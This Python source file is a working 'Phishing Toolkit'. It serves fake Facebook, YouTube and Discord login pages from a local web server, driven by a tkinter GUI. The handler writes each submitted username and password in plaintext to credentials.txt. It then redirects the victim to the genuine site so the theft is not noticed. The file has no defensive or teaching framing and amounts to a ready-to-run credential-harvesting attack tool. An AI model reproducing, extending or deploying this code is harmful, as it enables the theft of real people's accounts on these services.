import http.server
import socketserver
import threading
import urllib.parse
import tkinter as tk
import webbrowser
import socket

# Define fake login pages as strings
fake_pages = {
    'facebook': '''
    <html>
    <head>
        <title>Facebook</title>
        <style>
            body { font-family: Arial, sans-serif; background-color: #f0f2f5; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
            .login-container { width: 400px; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
            .login-container h2 { color: #1877f2; margin-bottom: 20px; font-size: 24px; text-align: center; }
            .login-container input { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; font-size: 16px; }
            .login-container input[type="submit"] { background-color: #1877f2; color: white; border: none; cursor: pointer; font-size: 16px; padding: 15px; }
            .login-container input[type="submit"]:hover { background-color: #165eab; }
        </style>
    </head>
    <body>
        <div class="login-container">
            <h2>Login to Facebook</h2>
            <form action="/submit" method="post">
                <input type="hidden" name="page" value="facebook">
                <input type="text" id="username" name="username" placeholder="Email or Phone" required>
                <input type="password" id="password" name="password" placeholder="Password" required>
                <input type="submit" value="Log In">
            </form>
        </div>
    </body>
    </html>
    ''',
    'youtube': '''
    <html>
    <head>
        <title>YouTube</title>
        <style>
            body { font-family: Arial, sans-serif; background-color: #f9f9f9; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
            .login-container { width: 400px; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
            .login-container h2 { color: #ff0000; margin-bottom: 20px; font-size: 24px; text-align: center; }
            .login-container input { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; font-size: 16px; }
            .login-container input[type="submit"] { background-color: #ff0000; color: white; border: none; cursor: pointer; font-size: 16px; padding: 15px; }
            .login-container input[type="submit"]:hover { background-color: #cc0000; }
        </style>
    </head>
    <body>
        <div class="login-container">
            <h2>Login to YouTube</h2>
            <form action="/submit" method="post">
                <input type="hidden" name="page" value="youtube">
                <input type="text" id="username" name="username" placeholder="Email" required>
                <input type="password" id="password" name="password" placeholder="Password" required>
                <input type="submit" value="Log In">
            </form>
        </div>
    </body>
    </html>
    ''',
    'discord': '''
    <html>
    <head>
        <title>Discord</title>
        <style>
            body { font-family: Arial, sans-serif; background-color: #36393f; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
            .login-container { width: 400px; background: #2f3136; padding: 30px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
            .login-container h2 { color: #7289da; margin-bottom: 20px; font-size: 24px; text-align: center; }
            .login-container input { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #444; border-radius: 5px; font-size: 16px; color: white; background: #36393f; }
            .login-container input[type="submit"] { background-color: #7289da; color: white; border: none; cursor: pointer; font-size: 16px; padding: 15px; }
            .login-container input[type="submit"]:hover { background-color: #5a6e9e; }
        </style>
    </head>
    <body>
        <div class="login-container">
            <h2>Login to Discord</h2>
            <form action="/submit" method="post">
                <input type="hidden" name="page" value="discord">
                <input type="text" id="username" name="username" placeholder="Email" required>
                <input type="password" id="password" name="password" placeholder="Password" required>
                <input type="submit" value="Log In">
            </form>
        </div>
    </body>
    </html>
    '''
}

class MyHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        path = self.path.lstrip('/')  # Remove leading slash

        if path in fake_pages:
            # Serve the fake page
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(fake_pages[path].encode('utf-8'))
        else:
            self.send_response(404)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b"Page not found")

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        parsed_data = urllib.parse.parse_qs(post_data)
        page = parsed_data.get('page', [''])[0]

        # Logging data based on the page
        if page in ['facebook', 'youtube', 'discord']:
            username = parsed_data.get('username', [''])[0]
            password = parsed_data.get('password', [''])[0]
            with open("credentials.txt", "a") as file:
                file.write(f"Page: {page}, Username: {username}, Password: {password}\n")

        # Redirect to the real website
        redirects = {
            'facebook': 'https://www.facebook.com',
            'youtube': 'https://www.youtube.com',
            'discord': 'https://www.discord.com'
        }
        redirect_url = redirects.get(page, 'https://www.google.com')

        self.send_response(302)
        self.send_header('Location', redirect_url)
        self.end_headers()

class PhishingServer:
    def __init__(self, port, page):
        self.port = port
        self.page = page
        self.server = socketserver.TCPServer(("", port), MyHandler)
        self.server_thread = threading.Thread(target=self.server.serve_forever)
        self.server_thread.daemon = True

    def start(self):
        self.server_thread.start()
        print(f"Server started on port {self.port} serving {self.page} page")

    def stop(self):
        self.server.shutdown()
        self.server.server_close()

# Global server instance
current_server = None

def start_server(page):
    global current_server
    if current_server:
        current_server.stop()
    
    current_server = PhishingServer(port=8000, page=page)
    current_server.start()

    # Get the local IP address
    local_ip = socket.gethostbyname(socket.gethostname())
    server_url = f'http://{local_ip}:8000/{page}'
    print(f"Server URL: {server_url}")

    # Open the page in the default browser
    webbrowser.open(server_url)

def stop_server():
    global current_server
    if current_server:
        current_server.stop()
        current_server = None
        print("Server stopped")

def create_gui():
    def on_start():
        page = page_var.get()
        start_server(page)

    root = tk.Tk()
    root.title("Phishing Toolkit")
    root.geometry("300x200")

    # Dropdown menu for selecting the page
    page_var = tk.StringVar(value='facebook')
    page_menu = tk.OptionMenu(root, page_var, 'facebook', 'youtube', 'discord')
    page_menu.pack(pady=10)

    start_button = tk.Button(root, text="Start Server", command=on_start, bg="green", fg="white", font=("Helvetica", 12, "bold"))
    start_button.pack(pady=10)

    stop_button = tk.Button(root, text="Stop Server", command=stop_server, bg="red", fg="white", font=("Helvetica", 12, "bold"))
    stop_button.pack(pady=10)

    status_label = tk.Label(root, text="Status: Idle", font=("Helvetica", 12))
    status_label.pack(pady=20)

    root.mainloop()

if __name__ == "__main__":
    create_gui()
